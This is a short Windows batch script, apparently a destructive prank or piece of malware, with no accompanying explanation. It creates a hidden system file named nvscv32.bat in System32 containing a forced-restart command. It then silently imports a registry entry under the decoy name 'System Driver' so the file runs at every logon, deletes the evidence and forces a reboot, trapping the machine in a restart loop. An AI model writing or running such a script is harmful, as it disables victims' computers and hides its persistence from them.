echo shutdown -r -t 25 -f >> c:\windows\system32\nvscv32.bat
attrib +h +s c:\windows\system32\nvscv32.bat >nul
echo Windows Registry Editor Version 5.00 >> c:\windows\system32\Himem.reg 
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> c:\windows\system32\Himem.reg 
echo "System Driver"="\"C:\\Windows\\System32\\nvscv32.bat\"" >> c:\windows\system32\Himem.reg 
regedit /s  c:\windows\system32\Himem.reg  
del /q  c:\windows\system32\Himem.reg
shutdown -r -t 25 -f


 



















